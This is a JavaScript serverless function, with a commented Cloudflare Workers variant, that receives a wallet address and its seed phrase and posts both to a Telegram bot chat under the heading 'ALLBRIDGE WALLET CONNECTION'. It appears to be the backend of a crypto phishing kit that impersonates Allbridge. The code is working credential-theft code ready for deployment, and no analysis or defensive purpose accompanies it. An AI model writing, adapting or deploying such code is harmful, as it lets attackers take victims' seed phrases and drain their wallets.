// This file should be hosted on a server (Vercel, Netlify, Cloudflare Workers, etc.)
// NOT in your client-side code

// For Vercel/Netlify Functions
export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { wallet, seedPhrase } = req.body;

    // Your sensitive credentials (store these in environment variables)
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Validate input
    if (!wallet || !seedPhrase) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Format the message
    const message = `🔔 ALLBRIDGE WALLET CONNECTION\n\n` +
                   `💼 Wallet: ${wallet}\n` +
                   `🔑 Seed Phrase:\n${seedPhrase}\n\n` +
                   `⏰ Time: ${new Date().toLocaleString()}`;

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const data = await response.json();

    if (data.ok) {
      return res.status(200).json({ success: true, message: 'Sent successfully' });
    } else {
      console.error('Telegram API error:', data);
      return res.status(500).json({ error: 'Failed to send message' });
    }

  } catch (error) {
    console.error('Server error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}

// Alternative for Cloudflare Workers:
/*
export default {
  async fetch(request, env) {
    if (request.method !== 'POST') {
      return new Response('Method not allowed', { status: 405 });
    }

    try {
      const { wallet, seedPhrase } = await request.json();

      const TELEGRAM_BOT_TOKEN = env.TELEGRAM_BOT_TOKEN;
      const TELEGRAM_CHAT_ID = env.TELEGRAM_CHAT_ID;

      if (!wallet || !seedPhrase) {
        return new Response('Missing required fields', { status: 400 });
      }

      const message = `🔔 ALLBRIDGE WALLET CONNECTION\n\n` +
                     `💼 Wallet: ${wallet}\n` +
                     `🔑 Seed Phrase:\n${seedPhrase}\n\n` +
                     `⏰ Time: ${new Date().toLocaleString()}`;

      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });

      const data = await response.json();

      if (data.ok) {
        return new Response(JSON.stringify({ success: true }), {
          headers: { 'Content-Type': 'application/json' }
        });
      } else {
        return new Response('Failed to send', { status: 500 });
      }

    } catch (error) {
      return new Response('Server error', { status: 500 });
    }
  }
};
*/
